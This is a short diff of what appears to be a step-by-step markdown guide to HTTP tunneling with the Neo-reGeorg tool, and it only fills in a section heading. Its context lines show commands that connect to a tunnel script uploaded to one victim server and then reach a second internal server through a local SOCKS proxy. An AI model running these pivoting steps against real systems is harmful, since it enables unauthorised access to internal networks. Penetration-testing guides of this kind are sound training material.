@@ -10,7 +10,7 @@
 
     python3 neoreg.py -k KEY -u http://VICTIM_SERVER1/uploader/files/tunnel.php
 
-#### 4) 
+#### 4) HTTP Tunneling done
 
     curl --socks5 127.0.0.1:1080 http://VICTIM_SERVER2:80 
 
